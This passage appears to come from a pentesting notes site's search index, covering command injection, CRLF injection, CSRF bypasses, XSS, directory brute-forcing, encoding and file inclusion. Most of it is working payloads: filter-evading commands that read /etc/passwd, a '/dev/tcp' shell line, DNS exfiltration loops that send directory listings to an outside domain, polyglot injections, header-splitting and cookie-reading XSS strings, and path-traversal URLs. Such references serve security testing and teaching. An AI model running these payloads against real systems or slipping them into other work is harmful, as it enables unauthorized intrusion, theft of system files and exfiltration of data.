{cat,/etc/passwd}\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\nswissky@crashlab\u25b8 ~ \u25b8 $ cat$IFS/etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\nswissky@crashlab\u25b8 ~ \u25b8 $ echo${IFS}\"RCE\"${IFS}&amp;&amp;cat${IFS}/etc/passwd\nRCE\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\nswissky@crashlab\u25b8 ~ \u25b8 $ X=$'uname\\x20-a'&amp;&amp;$X\nLinux crashlab 4.4.X-XX-generic #72-Ubuntu\n\nswissky@crashlab\u25b8 ~ \u25b8 $ sh&lt;/dev/tcp/127.0.0.1/4242\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#commands-execution-without-spaces-or-linux-bash-only","title":"Commands execution without spaces, $ or { } - Linux (Bash only)","text":"<pre><code>IFS=,;`cat&lt;&lt;&lt;uname,-a`\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#works-on-windows-only","title":"Works on Windows only.","text":"<pre><code>ping%CommonProgramFiles:~10,-18%IP\nping%PROGRAMFILES:~10,-5%IP\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#bypass-with-a-line-return","title":"Bypass with a line return","text":"<pre><code>something%0Acat%20/etc/passwd\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#bypass-characters-filter-via-hex-encoding","title":"Bypass characters filter via hex encoding","text":"<pre><code>#linux\n\nswissky@crashlab\u25b8 ~ \u25b8 $ echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"\n/etc/passwd\n\nswissky@crashlab\u25b8 ~ \u25b8 $ cat `echo -e \"\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\"`\nroot:x:0:0:root:/root:/bin/bash\n\nswissky@crashlab\u25b8 ~ \u25b8 $ abc=$'\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64';cat abc\nroot:x:0:0:root:/root:/bin/bash\n\nswissky@crashlab\u25b8 ~ \u25b8 $ `echo $'cat\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'`\nroot:x:0:0:root:/root:/bin/bash\n\nswissky@crashlab\u25b8 ~ \u25b8 $ xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764\n/etc/passwd\n\nswissky@crashlab\u25b8 ~ \u25b8 $ cat `xxd -r -p &lt;&lt;&lt; 2f6574632f706173737764`\nroot:x:0:0:root:/root:/bin/bash\n\nswissky@crashlab\u25b8 ~ \u25b8 $ xxd -r -ps &lt;(echo 2f6574632f706173737764)\n/etc/passwd\n\nswissky@crashlab\u25b8 ~ \u25b8 $ cat `xxd -r -ps &lt;(echo 2f6574632f706173737764)`\nroot:x:0:0:root:/root:/bin/bash\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#bypass-characters-filter","title":"Bypass characters filter","text":"<pre><code>#Commands execution without backslash and slash - linux bash\n\nswissky@crashlab\u25b8 ~ \u25b8 $ echo ${HOME:0:1}\n/\n\nswissky@crashlab\u25b8 ~ \u25b8 $ cat ${HOME:0:1}etc${HOME:0:1}passwd\nroot:x:0:0:root:/root:/bin/bash\n\nswissky@crashlab\u25b8 ~ \u25b8 $ echo . | tr '!-0' '\"-1'\n/\n\nswissky@crashlab\u25b8 ~ \u25b8 $ tr '!-0' '\"-1' &lt;&lt;&lt; .\n/\n\nswissky@crashlab\u25b8 ~ \u25b8 $ cat $(echo . | tr '!-0' '\"-1')etc$(echo . | tr '!-0' '\"-1')passwd\nroot:x:0:0:root:/root:/bin/bash\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#bypass-blacklisted-words","title":"Bypass Blacklisted words","text":""},{"location":"Pentesting/Web%20Application/command-injection/#bypass-with-single-quote","title":"Bypass with single quote","text":"<pre><code>w'h'o'am'i\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#bypass-with-double-quote","title":"Bypass with double quote","text":"<pre><code>w\"h\"o\"am\"i\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#bypass-with-backslash-and-slash","title":"Bypass with backslash and slash","text":"<pre><code>w\\ho\\am\\i\n/\\b\\i\\n/////s\\h\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#bypass-with","title":"Bypass with $@","text":"<pre><code>who$@ami\n\necho $0\n-&gt; /usr/bin/zsh\necho whoami|$0\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#bypass-with-variable-expansion","title":"Bypass with variable expansion","text":"<pre><code>/???/??t /???/p??s??\n\ntest=/ehhh/hmtc/pahhh/hmsswd\ncat ${test//hhh\\/hm/}\ncat ${test//hh??hm/}\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#bypass-with-wildcards","title":"Bypass with wildcards","text":"<pre><code>powershell C:\\*\\*2\\n??e*d.*? # notepad\n@^p^o^w^e^r^shell c:\\*\\*32\\c*?c.e?e # calc\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#time-based-data-exfiltration","title":"Time based data exfiltration","text":"<p>Extracting data : char by char</p> <pre><code>swissky@crashlab\u25b8 ~ \u25b8 $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi\nreal    0m5.007s\nuser    0m0.000s\nsys 0m0.000s\n\nswissky@crashlab\u25b8 ~ \u25b8 $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi\nreal    0m0.002s\nuser    0m0.000s\nsys 0m0.000s\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#dns-based-data-exfiltration","title":"DNS based data exfiltration","text":"<p>Based on the tool from <code>https://github.com/HoLyVieR/dnsbin</code> also hosted at dnsbin.zhack.ca</p> <pre><code>1. Go to http://dnsbin.zhack.ca/\n2. Execute a simple 'ls'\nfor i in $(ls /) ; do host \"$i.3a43c7e4e57a8d0e2057.d.zhack.ca\"; done\n</code></pre> <pre><code>$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)\n</code></pre> <p>Online tools to check for DNS based data exfiltration:</p> <ul> <li>dnsbin.zhack.ca</li> <li>pingb.in</li> </ul>"},{"location":"Pentesting/Web%20Application/command-injection/#polyglot-command-injection","title":"Polyglot command injection","text":"<pre><code>1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\n\ne.g:\necho 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\necho '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\necho \"1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}\";sleep${IFS}9;#${IFS}\n</code></pre> <pre><code>/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\n\ne.g:\necho 1/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\necho \"YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/\"\necho 'YOURCMD/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'\"||sleep(5)||\"/*`*/'\n</code></pre>"},{"location":"Pentesting/Web%20Application/command-injection/#tools","title":"Tools","text":"<ul> <li> <p>https://github.com/commixproject/commix</p> </li> <li> <p>https://portswigger.net/bappstore/33e4402eee514724b768c0342abadb8a</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/command-injection/#references","title":"References","text":"<ul> <li> <p>https://github.com/PortSwigger/command-injection-attacker</p> </li> <li> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection</p> </li> <li> <p>https://portswigger.net/support/using-burp-to-test-for-os-command-injection-vulnerabilities</p> </li> <li> <p>https://threat.tevora.com/stop-collaborate-and-listen/</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/crlf-injection-0d-0a/","title":"CRLF Injection","text":""},{"location":"Pentesting/Web%20Application/crlf-injection-0d-0a/#crlf-injection","title":"CRLF Injection","text":""},{"location":"Pentesting/Web%20Application/crlf-injection-0d-0a/#what-is-crlf-injection","title":"What is CRLF Injection?","text":"<p>CRLF injection vulnerability is a type of security flaw that occurs when an attacker can inject carriage return (CR) and line feed (LF) characters into an application's input. These characters are used to control the formatting of text in protocols like HTTP. Exploiting this vulnerability can allow attackers to manipulate the behavior of the application, such as inserting additional HTTP headers, modifying content, or performing other malicious actions. This can lead to various attacks, including HTTP response splitting, cross-site scripting (XSS), and session fixation.</p>"},{"location":"Pentesting/Web%20Application/crlf-injection-0d-0a/#payloads","title":"Payloads","text":"<pre><code>1. HTTP Response Splitting\n\n\u2022 /%0D%0ASet-Cookie:mycookie=myvalue\n\n2. CRLF chained with Open Redirect\n\n\u2022 //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0\n\n\u2022 /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0\n\n\u2022 /google.com/%2F..%0D%0AHeader-Test:test2\n\n\u2022 /%0d%0aLocation:%20http://example.com\n\n3. CRLF Injection to XSS\n\n\u2022 /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23\n\n\u2022 /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E\n\n4. Filter Bypass\n\n\u2022 %E5%98%8A = %0A = \\u560a\n\n\u2022 %E5%98%8D = %0D = \\u560d\n\n\u2022 %E5%98%BE = %3E = \\u563e (&gt;)\n\n\u2022 %E5%98%BC = %3C = \\u563c (&lt;)\n\n\u2022 Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test\n</code></pre>"},{"location":"Pentesting/Web%20Application/crlf-injection-0d-0a/#reference","title":"Reference:","text":"<ul> <li>https://medium.com/cyberverse/crlf-injection-playbook-472c67f1cb46</li> </ul>"},{"location":"Pentesting/Web%20Application/cross-site-request-forgery-csrf/","title":"Cross-Site Request Forgery (CSRF)","text":""},{"location":"Pentesting/Web%20Application/cross-site-request-forgery-csrf/#cross-site-request-forgery-csrf","title":"Cross-Site Request Forgery (CSRF)","text":""},{"location":"Pentesting/Web%20Application/cross-site-request-forgery-csrf/#what-is-csrf","title":"What is CSRF?","text":"<p>This vulnerability refers to an attack against authenticated web applications using cookies. The attacker is able to trick the victim into making a request that the victim did not intend to make.</p>"},{"location":"Pentesting/Web%20Application/cross-site-request-forgery-csrf/#csrf-bypass","title":"CSRF Bypass","text":"<ul> <li> <p>Change Request Method [POST =&gt; GET]</p> </li> <li> <p>Decoding CSRF tokens</p> </li> <li> <p>Extracting token via HTML injection</p> </li> <li> <p>Using only the static parts of the token</p> </li> <li> <p>Try to remove the referer header</p> </li> <li> <p>There might be hotlinking preset so try to bypass it</p> </li> <li> <p>Remove Total Token Parameter</p> </li> <li> <p>Remove The Token, And Give a Blank Parameter</p> </li> <li> <p>Copy a Unused Valid Token , By Dropping The Request and Use That Token</p> </li> <li> <p>Use Own CSRF Token To Feed it to Victim</p> </li> <li> <p>Replace Value With Of A Token of Same Length</p> </li> <li> <p>Reverse Engineer The Token</p> </li> <li> <p>Extract Token via HTML injection</p> </li> <li> <p>Switch From Non-Form <code>Content-Type: application/json</code> or <code>Content-Type: application/x-url-encoded</code> To <code>Content-Type: form-multipart</code></p> </li> <li> <p>Bypass the regex</p> </li> </ul> <p>If the site is looking for \u201cbank.com\u201d in the referer URL, maybe \u201cbank.com.attacker.com\u201d or \u201cattacker.com/bank.com\u201d will work.</p> <ul> <li> <p>Remove the referer header (add this  in your payload or html code)</p> </li> <li> <p>Bypass referrer header protection</p> </li> </ul> <p><code>&lt;meta name=\"referrer\" content=\"no-referrer\"&gt;</code></p> <p>If whitelisting present. try these following things.</p> <p><code>victim.com.attacker.com, attacker.com/victim.com</code></p> <ul> <li>Clickjacking</li> </ul> <p>(If you aren\u2019t familiar with clickjacking attacks, more information can be found https://owasp.org/www-community/attacks/Clickjacking.)</p> <p>Exploiting clickjacking on the same endpoint bypasses all CSRF protection. Because technically, the request is indeed originating from the legitimate site. If the page where \u00a0 the vulnerable endpoint is located on is vulnerable to clickjacking, all CSRF protection will be rendered irrelevant and you will be able to achieve the same results as a CSRF \u00a0 attack on the endpoint, albeit with a bit more effort.</p>"},{"location":"Pentesting/Web%20Application/cross-site-request-forgery-csrf/#mindmap","title":"MindMap","text":""},{"location":"Pentesting/Web%20Application/cross-site-request-forgery-csrf/#tools","title":"Tools","text":"<p>https://github.com/0xInfection/XSRFProbe</p> <p>https://github.com/PortSwigger/csrf-scanner</p> <p></p>"},{"location":"Pentesting/Web%20Application/cross-site-request-forgery-csrf/#references","title":"References","text":"<ul> <li> <p>https://www.youtube.com/watch?v=eWEgUcHPle0</p> </li> <li> <p>https://portswigger.net/web-security/csrf</p> </li> <li> <p>https://medium.com/bugbountywriteup/lets-bypass-csrf-protection-password-confirmation-to-takeover-victim-accounts-d-4a21297847ff</p> </li> <li> <p>https://github.com/KathanP19/HowToHunt</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/","title":"Cross-site scripting (XSS)","text":""},{"location":"Pentesting/Web%20Application/cross-site-scripting/#cross-site-scripting-xss","title":"Cross-site scripting (XSS)","text":""},{"location":"Pentesting/Web%20Application/cross-site-scripting/#concept","title":"Concept","text":"<p>Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.</p>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#types-of-xss","title":"Types of XSS","text":"<ul> <li> <p>Reflected cross-site scripting.</p> </li> <li> <p>Stored cross-site scripting. [Blind XSS comes under S-XSS)</p> </li> <li> <p>Document Object Model-based cross-site scripting</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#reflected-cross-site-scripting","title":"Reflected Cross-Site Scripting","text":"<p>Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.</p>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#stored-cross-site-scripting","title":"Stored Cross-Site Scripting","text":"<p>Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way. Stored XSS allows potential attackers to inject client-side scripts directly onto target servers. This is not just a single user issue, however, it affects everyone who has access to these servers. Once attackers find a vulnerability in the web application, they can inject their script and wait for an unsuspecting target to fall into their trap. Sites that allow their users to share content (like blogs or social networking sites) are often the most targeted. The injected script is permanently stored on the now infected servers and allows the attacker to set their targets up to receive the malicious script from the servers when they make a request.</p>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#blind-cross-site-scripting","title":"Blind Cross-Site Scripting","text":"<p>Blind XSS vulnerabilities are a variant of persistent XSS vulnerabilities. They occur when the attacker input is saved by the web server and executed as a malicious script in another part of the application or in another application. For example, an attacker injects a malicious payload into a contact/feedback page and when the administrator of the application is reviewing the feedback entries the attacker\u2019s payload will be loaded. The attacker input can be executed in a completely different application (for example an internal application where the administrator reviews the access logs or the application exceptions).</p>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#document-object-model-based-cross-site-scripting","title":"Document Object Model-based Cross-Site Scripting","text":"<p>DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as <code>eval()</code> or <code>innerHTML</code>. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.</p>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#xss-via-file-upload-payloads","title":"XSS via file upload payloads","text":""},{"location":"Pentesting/Web%20Application/cross-site-scripting/#xss-in-a-filename","title":"XSS in a filename","text":"<pre><code>\"&gt;&lt;img src=v onerror=prompt(xss);&gt;.jpeg\n</code></pre>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#metadata-exit-tool","title":"Metadata (exit tool)","text":"<pre><code>exiftool -Artist=\u2019 \u201c&gt;&lt;img src=1 onerror=alert(document.domain)&gt;\u2019\n\nbrute.jpeg\n</code></pre>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#svg-content-xss-save-the-below-content-in-svg-file","title":"SVG content XSS (save the below content in SVG file)","text":"<pre><code>&lt;svg xmlns=\"http://www.w3.org/2000/svg\"\n\nonload=\"alert(document.domain)\"/&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#gif-extension-xss-save-the-below-content-in-gif-file","title":"Gif extension XSS (save the below content in gif file)","text":"<pre><code>GIF89a/*&lt;svg/onload=alert(1)&gt;*/=alert(document.domain)//;\n</code></pre>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#html-extension-save-the-below-content-in-html-file","title":"Html extension (save the below content in HTML file)","text":"<pre><code>&lt;!DOCTYPE html&gt;\n\n&lt;html&gt;\n\n&lt;head&gt;\n\n&lt;title&gt;XSS&lt;/title&gt;\n\n&lt;/head&gt;\n\n&lt;body&gt;\n\n&lt;script type=\"text/javascript\"&gt;alert(document.cookie)&lt;/script&gt;\n\n&lt;script&gt;prompt(1);&lt;/script&gt;\n\n&lt;/body&gt;\n\n&lt;/html&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#pdf-extension","title":"PDF extension","text":"<ul> <li>When content-type is not checked and magic bytes and file extensions are being checked.</li> </ul> <pre><code>%PDF-1.4\n\n%\u00c3\u00a4\u00c3\u00bc\u00c3\u00b6\u00c3\u009f\n\n2 0 obj\n\n&lt;&lt;/Length 3 0 R/Filter/FlateDecode&gt;&gt;\n\nstream\n\nx\u009c=\u008e\u00cb\n\n1E\u00f7\u00f9\u008a\u00bbv\u0093\u00b6\u00e9\u00b40\u00e8~ \u00e0\u00f8\n\nR\n\nR&lt;img src=x onerror=alert(document.cookie)&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#payloads","title":"Payloads","text":""},{"location":"Pentesting/Web%20Application/cross-site-scripting/#bypassing-first-filter","title":"Bypassing First Filter","text":"<pre><code>\\&lt;svg//////onload=alert(1)&gt;\n</code></pre> <pre><code>\\&lt;svg id=x;onload=alert(1)&gt;\n</code></pre> <pre><code>\\&lt;svg id=\\`x\\`onload=alert(1)&gt;\n</code></pre> <pre><code>\\&lt;svg%09onload=alert(1)&gt;\n</code></pre> <pre><code>\\&lt;svg onload%09=alert(1)&gt;\n</code></pre> <pre><code>\\&lt;svg%09onload%20=alert(1)&gt;\n</code></pre> <pre><code>\\&lt;svg onload%09%20%28%2C%3B=alert(1)&gt;\n</code></pre> <pre><code>\\&lt;svg onload+0B=alert(1)&gt;\n</code></pre> <pre><code>\\&lt;script&gt;\\u0061lert(1)\\&lt;/script&gt;\n</code></pre> <pre><code>\\&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(1)\\&lt;/script&gt;\n</code></pre> <pre><code>\\&lt;img src=x onerror=\"\\u0061lert\"/&gt;\n</code></pre> <pre><code>\\&lt;img src=x onerror=\"eval('\\141lert(1)')\"/&gt;\n</code></pre> <pre><code>\\&lt;img src=x onerror=\"eval('\\x61lert(1)')\"/&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#javascript-keyword-is-blocked","title":"Javascript Keyword is blocked","text":"<pre><code>\\&lt;object data=\"JaVaScRiPt:alert(1)\"&gt;\n</code></pre> <pre><code>\\&lt;object data=\"javascript\\&amp;colon;alert(1)\"&gt;\n</code></pre> <pre><code>\\&lt;object data=\"java &amp;#x20;&amp;#x20;script:alert(1)\"&gt;\n</code></pre> <pre><code>\\&lt;object data=\"javascript\\&amp;#x003A;alert(1)\"&gt;\n</code></pre> <pre><code>\\&lt;object data=\"javascript\\&amp;#58;alert(1)\"&gt;\n</code></pre> <pre><code>\\&lt;object data=\"\\&amp;#x6A;avascript;alert(1)\"&gt;\n</code></pre> <pre><code>\\&lt;object data=\"\\&amp;#x6A;\\&amp;#x61;\\&amp;#x76;\\&amp;#x61;\\&amp;#x73;\\&amp;#x63;\\&amp;#x72;\\&amp;#x69;\\&amp;#x70;74;\\&amp;#x3A;alert(1)\"&gt;\n</code></pre> <pre><code>\\&lt;object data=\"data:text/html,\\&lt;script&gt;alert(1)\\&lt;/script&gt;\"&gt;\n</code></pre> <pre><code>\\&lt;object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\"&gt;\n</code></pre>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#tools","title":"Tools","text":"<ul> <li>https://xsshunter.com</li> </ul> <p>The Best tool for Blind XSS</p> <ul> <li>https://github.com/ssl/ezXSS</li> </ul> <p>Has 2fa, email reports, share reports feature</p> <ul> <li>https://knoxss.me/</li> </ul> <p>Knoxss</p> <ul> <li> <p>https://www.irongeek.com/homoglyph-attack-generator.php</p> </li> <li> <p>https://portswigger.net/burp/documentation/collaborator</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#automation-xss","title":"Automation XSS","text":"<ul> <li>https://github.com/theinfosecguy/QuickXSS</li> </ul>"},{"location":"Pentesting/Web%20Application/cross-site-scripting/#references","title":"References","text":"<ul> <li> <p>Reflected cross-site scripting</p> </li> <li> <p>Stored cross-site scripting</p> </li> <li> <p>Document Object Model-based cross-site scripting</p> </li> <li> <p>Blind Cross-site scripting</p> </li> <li> <p>https://www.youtube.com/watch?v=EoaDgUgS6QA</p> </li> <li> <p>https://www.youtube.com/watch?v=gkMl1suyj3M</p> </li> <li> <p>https://brutelogic.com.br/blog/</p> </li> <li> <p>https://portswigger.net/web-security/cross-site-scripting</p> </li> <li> <p>https://medium.com/@bhaveshthakur2015/content-security-policy-csp-bypass-techniques-e3fa475bfe5d</p> </li> <li> <p>https://t.co/7O45xvRMf4?amp=1</p> </li> <li> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection</p> </li> <li> <p>https://github.com/payloadbox/xss-payload-list</p> </li> <li> <p>https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot</p> </li> <li> <p>https://github.com/s0md3v/AwesomeXSS</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/directory-enumeration/","title":"Directory Bruteforce","text":""},{"location":"Pentesting/Web%20Application/directory-enumeration/#directory-bruteforce","title":"Directory Bruteforce","text":""},{"location":"Pentesting/Web%20Application/directory-enumeration/#concept","title":"Concept","text":"<p>Directory Bruteforce is a way to find hidden and/or non-ranked directories/files on a website that allows an attacker to read possible sensitive files on the server. This might include application code and data, credentials for back-end systems, and sensitive operating system files. The effective way to do a brute-force is to have knowledge of a technology used by the webserver.</p>"},{"location":"Pentesting/Web%20Application/directory-enumeration/#tools","title":"Tools","text":"<ul> <li> <p>https://github.com/ffuf/ffuf</p> </li> <li> <p>https://github.com/xmendez/wfuzz</p> </li> <li> <p>https://github.com/maurosoria/dirsearch</p> </li> <li> <p>https://github.com/tomnomnom/meg</p> </li> <li> <p>https://wordlists.assetnote.io/</p> </li> </ul>"},{"location":"Pentesting/Web%20Application/directory-enumeration/#references","title":"References","text":"<ul> <li>https://gist.github.com/jhaddix/</li> </ul>"},{"location":"Pentesting/Web%20Application/encoding/","title":"Encoding","text":""},{"location":"Pentesting/Web%20Application/encoding/#encoding","title":"Encoding","text":"<p>Encoding is the process of transforming data from one format into another agreed-upon universal code system/scheme</p>"},{"location":"Pentesting/Web%20Application/encoding/#types-of-encoding","title":"Types of Encoding","text":"<ol> <li>URL Encoding</li> <li>HTML Encoding</li> <li>Base 36/64 Encoding</li> <li>Unicode Encoding</li> </ol>"},{"location":"Pentesting/Web%20Application/encoding/#url-encoding","title":"URL Encoding","text":"<p>URL Encoding is a filter that converts certain characters of a URL into % and is followed by the hexadecimal equivalent of the character.</p> <p>example</p> <ul> <li>#:- %23</li> <li>?:- %3f</li> <li>&amp;:- %3f</li> </ul>"},{"location":"Pentesting/Web%20Application/encoding/#html-encoding","title":"HTML Encoding","text":"<p>The document transmitted via HTTP can send a charset parameter in the header containing Content-Type. </p> <p>Content-Type:text/html; charset=utf-8</p>"},{"location":"Pentesting/Web%20Application/encoding/#base3664-encoding","title":"Base36/64 Encoding","text":"<p>Binary to Text encoding, in addition to Base16 encoding scheme Base36 and Base 64 are introduced.</p> <p>Base36</p> <p>It is the most case sensitive encoding scheme, as it contains all the numbers from[0-9] and latine letters [a-z]</p> <p>example</p> Binary Base36 0001 1 1010 a <p>Base64 </p> <p>It is the most widespread encoding scheme, it allows the represent binary data into ASCII strings. Base64 is not an encryption technique. it contains [0-9], [a-z], [A-Z] and to complete the count of 64 + and slash / are added. it divides a string into 6bits.</p> <p>example</p> Binary Base64 0000 A 011010 a 111110 +"},{"location":"Pentesting/Web%20Application/encoding/#unicode-encoding","title":"Unicode Encoding","text":"<p>Unicode Encoding contains glyphs, numbers and etc. </p> <p>There are three ways to map encode character points</p> <ul> <li>UTF-8</li> <li>UTF-16</li> <li>UTF-32</li> </ul>"},{"location":"Pentesting/Web%20Application/file-inclusion/","title":"File Inclusion","text":""},{"location":"Pentesting/Web%20Application/file-inclusion/#file-inclusion","title":"File Inclusion","text":""},{"location":"Pentesting/Web%20Application/file-inclusion/#what-is-file-inclusion","title":"What is File Inclusion?","text":"<p>The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a \"dynamic file inclusion\" mechanisms implemented in the target application. This vulnerability also allows an attacker to access unauthorised or sensitive files available on the web server or to execute malicious files on the web server by making use of the \u2018include\u2019 functionality.</p>"},{"location":"Pentesting/Web%20Application/file-inclusion/#types-of-file-inclusion","title":"Types of File Inclusion","text":""},{"location":"Pentesting/Web%20Application/file-inclusion/#local-file-inclusion-lfi","title":"Local File Inclusion (LFI)","text":"<p>In this the attacker can retrieve files from the local server also he can execute files of the local server.</p>"},{"location":"Pentesting/Web%20Application/file-inclusion/#remote-file-inclusion-rfi","title":"Remote File Inclusion (RFI)","text":"<p>Through this vulnerability the attacker can execute the remotes files on the server, In general words, This vulnerability occurs occurs when the web application downloads and executes a remote file.</p>"},{"location":"Pentesting/Web%20Application/file-inclusion/#difference-between-directory-transversal-file-inclusion","title":"Difference between Directory transversal &amp; File Inclusion","text":"<p>Local and remote file inclusion can be differentiated by reviewing the source code of php.ini (it can be found in PHP/apache2/php.ini).  By default, this is the configuration \"allow url_include= OFF\". However, sometimes developer change this configuration to \"ON\" for redirecting the user or pulling the resource of the user from a different application. If the configuration is \"allow url_include = ON\" only then RFI is possible. LFI does not rely on this condition. Parameters which differentiates all these vulnerabilities are summarised in below table.\\</p> Parameters Path Traversal LFI RFI Missing access control of directories Yes N/A N/A Allow_URL include = ON in php.ini N/A Yes Yes Allow_URL include = OFF in php.ini N/A Yes No No input validation on include pages and files Yes Yes N/A <p>In Directory transversal an attacker can retrieve unauthorized files and directories from the server, &amp; in Local File Inclusion an attacker can retrieve files from the server as well as can execute files of the server. This extra functionality makes LFI different from directory traversal/path traversal. Therefore, we can say that path/directory traversal is a subset of LFI</p>"},{"location":"Pentesting/Web%20Application/file-inclusion/#payloads","title":"Payloads","text":""},{"location":"Pentesting/Web%20Application/file-inclusion/#basic-lfi","title":"Basic LFI","text":"<p>In the following examples we include the <code>/etc/passwd</code> file, check the <code>Directory &amp; Path Traversal</code> chapter for more interesting files.</p> <pre><code>http://example.com/index.php?page=../../../etc/passwd\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#null-byte","title":"Null byte","text":"<p>\u26a0\ufe0f In versions of PHP below 5.3.4 we can terminate with null byte.</p> <pre><code>http://example.com/index.php?page=../../../etc/passwd%00\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#double-encoding","title":"Double encoding","text":"<pre><code>http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd\nhttp://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#utf-8-encoding","title":"UTF-8 encoding","text":"<pre><code>http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd\nhttp://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00\n</code></pre>"},{"location":"Pentesting/Web%20Application/file-inclusion/#path-and-dot-truncation","title":"Path and dot truncation","text":"<p>On most PHP installations a filename longer than 4096 bytes will be cut off so any excess chars will be thrown away.</p> <pre><code>http://example.com/index.php?page=../../../etc/passwd............[ADD MORE]\nhttp://example.com/index.php?page=../../../etc/passwd\\.\\.\\.\\.\\.\\.[ADD MORE]\nhttp://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] \nhttp://example.com/index.php?page=../../../[ADD 